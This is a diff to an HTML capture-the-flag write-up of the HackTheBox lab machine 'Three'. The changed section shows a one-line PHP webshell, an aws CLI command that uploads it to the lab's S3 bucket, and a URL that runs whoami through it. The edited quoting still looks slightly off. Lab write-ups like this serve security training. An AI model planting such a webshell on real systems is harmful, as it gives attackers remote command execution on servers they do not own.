@@ -51,7 +51,7 @@
 
     <h2>Post-Exploitation</h2>
       <p>I created a PHP webshell and uploaded it to <code>thetoppers.htb</code>. From there, I visited the website and ran <code>whoami</code> as a test.</p>
-    <pre><code>$ echo &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt; > shell.php<br>$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></pre>
+    <pre><code>$ echo '&lt;?php system($_GET[&quot;cmd&quot;]);' ?&gt; > shell.php<br>$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></pre>
     <img src="/images/htb/very-easy/three/three_upload_shell.png" alt="Three shell uploaded">
      <pre><code>http://thetoppers.htb/shell.php?cmd=whoami</code></pre>
     <img src="/images/htb/very-easy/three/three_web_shell.png" alt="Three web shell">
